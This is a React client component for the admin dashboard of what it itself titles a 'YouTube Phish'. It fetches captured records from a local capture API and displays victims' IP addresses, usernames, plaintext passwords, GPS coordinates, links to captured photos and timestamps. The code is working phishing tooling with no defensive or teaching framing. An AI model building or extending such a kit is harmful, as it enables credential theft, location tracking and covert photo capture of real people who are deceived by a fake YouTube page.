'use client';

import { useState, useEffect } from 'react';

export default function AdminPage() {
  const [data, setData] = useState([]);
  const [loading, setLoading] = useState(true);

  useEffect(() => {
    fetch('/api/capture?admin=true')
      .then((r) => r.json())
      .then((d) => {
        setData(Array.isArray(d) ? d : []);
        setLoading(false);
      })
      .catch(() => setLoading(false));
  }, []);

  return (
    <div style={{ fontFamily: 'monospace', background: '#111', color: '#0f0', padding: 20, minHeight: '100vh' }}>
      <h1 style={{ marginBottom: 20 }}>YouTube Phish — Captured Data</h1>
      {loading ? (
        <p>Loading...</p>
      ) : data.length === 0 ? (
        <p>No data captured yet.</p>
      ) : (
        <table style={{ borderCollapse: 'collapse', width: '100%' }}>
          <thead>
            <tr style={{ borderBottom: '1px solid #333' }}>
              <th style={{ padding: 8, textAlign: 'left' }}>ID</th>
              <th style={{ padding: 8, textAlign: 'left' }}>IP</th>
              <th style={{ padding: 8, textAlign: 'left' }}>Username</th>
              <th style={{ padding: 8, textAlign: 'left' }}>Password</th>
              <th style={{ padding: 8, textAlign: 'left' }}>Lat</th>
              <th style={{ padding: 8, textAlign: 'left' }}>Lng</th>
              <th style={{ padding: 8, textAlign: 'left' }}>Photo</th>
              <th style={{ padding: 8, textAlign: 'left' }}>Time</th>
            </tr>
          </thead>
          <tbody>
            {data.map((row) => (
              <tr key={row.id} style={{ borderBottom: '1px solid #222' }}>
                <td style={{ padding: 8 }}>{row.id}</td>
                <td style={{ padding: 8 }}>{row.ip_address}</td>
                <td style={{ padding: 8 }}>{row.username || '-'}</td>
                <td style={{ padding: 8 }}>{row.password || '-'}</td>
                <td style={{ padding: 8 }}>{row.latitude || '-'}</td>
                <td style={{ padding: 8 }}>{row.longitude || '-'}</td>
                <td style={{ padding: 8 }}>
                  {row.photo_url ? (
                    <a href={row.photo_url} target="_blank" rel="noopener noreferrer" style={{ color: '#3ea6ff' }}>
                      View Photo
                    </a>
                  ) : (
                    '-'
                  )}
                </td>
                <td style={{ padding: 8 }}>{row.captured_at ? new Date(row.captured_at).toLocaleString() : '-'}</td>
              </tr>
            ))}
          </tbody>
        </table>
      )}
    </div>
  );
}
